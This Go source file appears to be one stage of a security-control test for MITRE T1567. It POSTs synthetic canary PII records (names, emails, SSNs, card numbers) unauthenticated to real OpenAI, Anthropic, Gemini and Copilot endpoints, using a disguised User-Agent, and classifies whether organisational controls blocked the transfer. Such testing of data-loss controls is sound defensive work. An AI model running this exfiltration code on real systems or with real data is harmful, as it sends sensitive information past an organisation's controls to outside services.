// Stage 3 — Exfiltration to External Inference Services
// Technique: T1567 (Exfiltration Over Web Service)
//
// Reads the canary PII payload staged by Stage 2 (falls back to generating its own
// if run standalone) and POSTs it over real TLS, unauthenticated, to real AI vendor
// hosts (OpenAI, Anthropic, Gemini, Copilot). For each attempt it classifies the
// outcome using the integrity-critical logic in classifyEgress (see spec §4 and
// CLAUDE.md Bug Prevention Rule 8).
//
// SAFETY: no Authorization/API-key header is ever sent — hosts are hit
// unauthenticated (spec §6.2). Records are synthetic canaries (canary.go).
//
// CLASSIFICATION PRINCIPLE (load-bearing): key on WHO answered, not on status code.
//   - Any HTTP response over a TLS session that VALIDATES to the real vendor —
//     including a vendor 401/403 at its auth layer — means the bytes crossed the
//     boundary. That is a LEAK, never a block.
//   - A block requires positive evidence that *the org's* control intervened: a
//     vendor host resolving to a sinkhole/RFC1918/loopback, a TLS-interception
//     certificate error, or a proxy connection refused/reset to a public IP.
//   - Anything ambiguous defaults to error (999) — NEVER to a block code.
//
// Exit codes: 0 = PII LEAKED to >=1 vendor, 126 = an org control intervened
//             (no leak occurred), 999 = prerequisite/ambiguous (inconclusive).

//go:build windows || linux

package main

import (
	"bytes"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"

	"6d33cc62-d59d-4661-a76d-715aa4abddfd/classifier"
)

const (
	TEST_UUID      = "6d33cc62-d59d-4661-a76d-715aa4abddfd"
	TECHNIQUE_ID   = "T1567"
	TECHNIQUE_NAME = "Exfiltration to External Inference Services"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// vendorTarget describes one real AI inference endpoint.
type vendorTarget struct {
	Name        string
	Host        string
	URL         string
	ContentType string
	// buildBody renders a vendor-shaped chat-completion body embedding the PII text.
	buildBody func(text string) []byte
}

func vendorTargets() []vendorTarget {
	return []vendorTarget{
		{
			Name: "OpenAI", Host: "api.openai.com",
			URL: "https://api.openai.com/v1/chat/completions", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"model":"gpt-4o","messages":[{"role":"user","content":%q}]}`, t))
			},
		},
		{
			Name: "Anthropic", Host: "api.anthropic.com",
			URL: "https://api.anthropic.com/v1/messages", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"model":"claude-3-5-sonnet-20241022","max_tokens":256,"messages":[{"role":"user","content":%q}]}`, t))
			},
		},
		{
			Name: "Gemini", Host: "generativelanguage.googleapis.com",
			URL: "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"contents":[{"parts":[{"text":%q}]}]}`, t))
			},
		},
		{
			Name: "Copilot", Host: "api.githubcopilot.com",
			URL: "https://api.githubcopilot.com/chat/completions", ContentType: "application/json",
			buildBody: func(t string) []byte {
				return []byte(fmt.Sprintf(`{"model":"gpt-4","messages":[{"role":"user","content":%q}]}`, t))
			},
		},
	}
}

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))

	code, detail := runStage()

	switch code {
	case StageSuccess:
		LogMessage("SUCCESS", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", detail)
	case StageBlocked, StageQuarantined:
		LogMessage("WARN", TECHNIQUE_ID, detail)
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, detail)
	default:
		LogMessage("ERROR", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", detail)
	}
	os.Exit(code)
}

func runStage() (int, string) {
	// Load the payload Stage 2 staged; fall back to a fresh canary set if standalone.
	var payload PIIPayload
	if p, err := ReadPayload(PayloadPath()); err == nil {
		payload = p
	} else {
		marker := GenerateRunMarker()
		payload = PIIPayload{
			Marker:      marker,
			GeneratedAt: time.Now().UTC().Format(time.RFC3339),
			Records:     GenerateCanarySet(10, marker),
		}
		LogMessage("INFO", TECHNIQUE_ID, "No staged payload found; generated a standalone canary set")
	}

	if len(payload.Records) == 0 {
		return StageError, "no canary records available to exfiltrate (prerequisite not met)"
	}

	text := renderExfilText(payload)
	targets := vendorTargets()

	Endpoint.Say("    [*] Attempting canary-PII egress to %d inference services (marker=%s)...", len(targets), payload.Marker)

	results := make([]classifier.Result, 0, len(targets))
	for _, tgt := range targets {
		res := classifyEgress(tgt, text)
		results = append(results, res)
		Endpoint.Say("        - %-10s => %-6s (%s)", tgt.Name, strings.ToUpper(res.Verdict), res.Evidence)
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("%s: %s — %s", tgt.Name, res.Verdict, res.Evidence))
	}

	// Aggregate — LEAK DOMINATES. If any vendor received the PII, the honest verdict
	// is that data escaped, even if another egress path was blocked. Returning a
	// "protected" (126) verdict while data leaked would be a false reassurance
	// (CLAUDE.md Rule 8). Only when NOTHING leaked AND a control positively fired do
	// we report protected. Otherwise the run is inconclusive (999).
	leaks, blocks, errs := 0, 0, 0
	var leakVendors, blockVendors []string
	for _, r := range results {
		switch r.Verdict {
		case classifier.VerdictLeak:
			leaks++
			leakVendors = append(leakVendors, r.Vendor)
		case classifier.VerdictBlock:
			blocks++
			blockVendors = append(blockVendors, r.Vendor)
		default:
			errs++
		}
	}

	switch {
	case leaks > 0:
		return StageSuccess, fmt.Sprintf("Canary PII reached %d/%d vendor(s): %s (marker=%s)",
			leaks, len(targets), strings.Join(leakVendors, ", "), payload.Marker)
	case blocks > 0:
		return StageBlocked, fmt.Sprintf("All egress attempts stopped by org controls; positive block evidence at: %s",
			strings.Join(blockVendors, ", "))
	default:
		return StageError, fmt.Sprintf("No leak and no affirmative block evidence across %d vendor(s); %d inconclusive result(s)",
			len(targets), errs)
	}
}

// renderExfilText builds the sensitive-looking prompt content embedding canary PII.
func renderExfilText(p PIIPayload) string {
	var b strings.Builder
	b.WriteString("Please de-duplicate and summarize these customer records. ")
	b.WriteString(fmt.Sprintf("[trace-marker: %s]\n", p.Marker))
	b.WriteString("full_name,email,ssn,pan\n")
	for _, r := range p.Records {
		b.WriteString(fmt.Sprintf("%s,%s,%s,%s\n", r.FullName, r.Email, r.SSN, r.PAN))
	}
	return b.String()
}

// classifyEgress performs one exfil attempt and classifies the outcome. This is the
// integrity-critical function. It NEVER defaults to a block code.
func classifyEgress(tgt vendorTarget, text string) classifier.Result {
	// --- Step A: DNS. A vendor host resolving to loopback / RFC1918 / link-local /
	// unspecified is a DNS sinkhole or internal redirect — positive block evidence. ---
	ips, err := net.LookupIP(tgt.Host)
	if err != nil {
		// DNS failure is ambiguous (no network, NXDOMAIN, resolver down) — not a block.
		return classifier.Result{Vendor: tgt.Name, Verdict: classifier.VerdictError, Evidence: fmt.Sprintf("DNS resolution failed: %v", err)}
	}
	for _, ip := range ips {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
			return classifier.Result{Vendor: tgt.Name, Verdict: classifier.VerdictBlock,
				Evidence: fmt.Sprintf("vendor host resolved to non-routable %s (DNS sinkhole/redirect by an org control)", ip.String())}
		}
	}

	// --- Step B: HTTPS POST, unauthenticated, default TLS verification ON. ---
	// No Authorization header is set (spec §6.2 — hosts hit unauthenticated).
	client := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // inspect 3xx ourselves
		},
	}

	req, rerr := http.NewRequest(http.MethodPost, tgt.URL, bytes.NewReader(tgt.buildBody(text)))
	if rerr != nil {
		return classifier.Result{Vendor: tgt.Name, Verdict: classifier.VerdictError, Evidence: fmt.Sprintf("could not build request: %v", rerr)}
	}
	req.Header.Set("Content-Type", tgt.ContentType)
	req.Header.Set("User-Agent", "ai-assistant-helper/1.0")

	// Classification (leak/block/ambiguous) lives in the classifier package so it can be
	// unit-tested in isolation (see classifier/classifier_test.go). It NEVER defaults to
	// a block code.
	resp, derr := client.Do(req)
	if derr != nil {
		return classifier.ClassifyTransportError(tgt.Name, derr)
	}
	return classifier.ClassifyResponse(tgt.Name, tgt.Host, resp)
}
